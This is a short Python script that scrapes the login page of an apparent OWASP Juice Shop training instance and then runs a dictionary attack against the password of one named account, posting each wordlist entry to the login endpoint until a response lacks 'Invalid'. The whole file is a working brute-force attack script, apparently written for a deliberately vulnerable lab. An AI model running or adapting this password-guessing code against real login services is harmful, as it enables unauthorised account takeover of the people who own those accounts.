import requests
from bs4 import BeautifulSoup
from selenium import webdriver

url = "http://mozl-juice-shop.herokuapp.com/login#/login"
browser = webdriver.PhantomJS()
browser.get(url)
html = browser.page_source
soup = BeautifulSoup(html, 'lxml')
print(soup.prettify())

password_file = './example_dictionary.txt'
with open(password_file, 'r') as f:
  for word in f:
    word = word.strip('\n')
    trying_ = requests.post('http://mozl-juice-shop.herokuapp.com/rest/user/login', data={"email":"mc.safesearch@juice-sh.op", "password":word})

    if "Invalid" not in trying_.text:
      print('Success the password is: ' + word)
      break
    else:
      print('Incorrect password: ' + word)

